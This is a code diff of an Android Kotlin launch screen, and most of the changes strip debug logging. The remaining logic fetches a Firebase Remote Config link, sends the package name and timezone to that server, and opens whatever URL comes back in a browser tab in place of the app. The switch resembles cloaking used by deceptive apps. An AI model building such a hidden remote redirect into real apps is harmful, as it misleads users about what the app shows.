@@ -35,7 +35,9 @@ class LoadingActivity : ComponentActivity() {
 
         super.onCreate(savedInstanceState)
         setContent {
+
             val isShow by showLoading.collectAsState()
+
             if (isShow) {
                 Server_v1Theme {
                     StartScreen()
@@ -44,51 +46,51 @@ class LoadingActivity : ComponentActivity() {
         }
 
         val savedHost = PrefManager.getUrl()
+
         if (savedHost == null && Utils.isNetworkAvailable()) {
-            Log.e("LoadingActivity", "fetch")
             fetchConfig()
         } else if (!savedHost.isNullOrEmpty() && Utils.isNetworkAvailable()) {
-            Log.e("LoadingActivity", "saved Host $savedHost")
             showLoading.value = false
             openCustomTab()
         } else {
             showLoading.value = false
-            Log.e("LoadingActivity", "start main activity")
             startActivity(Intent(this, MainActivity::class.java))
         }
     }
 
     private fun fetchConfig() {
+
         val remoteConfig = Firebase.remoteConfig
+
         val configSettings = remoteConfigSettings {
             minimumFetchIntervalInSeconds = 3600
         }
+
         remoteConfig.setConfigSettingsAsync(configSettings)
-        Log.e("LoadingActivity", "start fetch")
+
         remoteConfig.fetchAndActivate()
-            .addOnCanceledListener {
-                Log.e("LoadingActivity", "")
-            }
+            .addOnCanceledListener { }
             .addOnCompleteListener(this) { task ->
-                Log.e("LoadingActivity", "fetch $task")
                 if (task.isSuccessful) {
+
                     val host: String = remoteConfig.getString("check_link")
-                    Log.e("LoadingActivity", host)
+
                     if (host.isEmpty()) {
                         PrefManager.setUrl("")
                         startActivity(Intent(this, MainActivity::class.java))
                     } else {
+
                         val url =
                             "$host/?packageid=${this.packageName}&usserid=${UUID.randomUUID()}&getz=${TimeZone.getDefault().id}&getr=utm_source=google-play&utm_medium=organic"
+
                         lifecycle.coroutineScope.launch(Dispatchers.IO) {
+
                             val url2 = obtainUrl(url)
+
                             withContext(Dispatchers.Main) {
                                 if (url2 == null) {
                                     startActivity(
-                                        Intent(
-                                            this@LoadingActivity,
-                                            MainActivity::class.java
-                                        )
+                                        Intent(this@LoadingActivity, MainActivity::class.java)
                                     )
                                 } else {
                                     openCustomTab()
@@ -104,7 +106,6 @@ class LoadingActivity : ComponentActivity() {
                 }
             }
             .addOnFailureListener {
-                Log.e("LoadingActivity", "err ${it.message}")
                 PrefManager.setUrl("")
                 startActivity(Intent(this, MainActivity::class.java))
             }
@@ -112,20 +113,20 @@ class LoadingActivity : ComponentActivity() {
 
     private fun openCustomTab() {
         val url = PrefManager.getUrl()
-        Log.e("LoadingActivity", "$url")
 
         val defaultColors = CustomTabColorSchemeParams.Builder()
             .setToolbarColor(Color.BLACK)
             .build()
+
         val builder = CustomTabsIntent.Builder().setDefaultColorSchemeParams(defaultColors)
 
         builder.build().launchUrl(this, Uri.parse(url))
     }
 
     private suspend fun obtainUrl(host: String): String? {
-        Log.e("url", host)
 
         val connection = URL(host).openConnection() as HttpURLConnection
+
         try {
             val data = connection.inputStream.bufferedReader().use { it.readText() }
             PrefManager.setUrl(data)
@@ -133,7 +134,6 @@ class LoadingActivity : ComponentActivity() {
         } catch (e: Exception) {
             e.printStackTrace()
             PrefManager.setUrl("")
-            Log.e("e.message", "${e.message}")
             return null
         } finally {
             connection.disconnect()
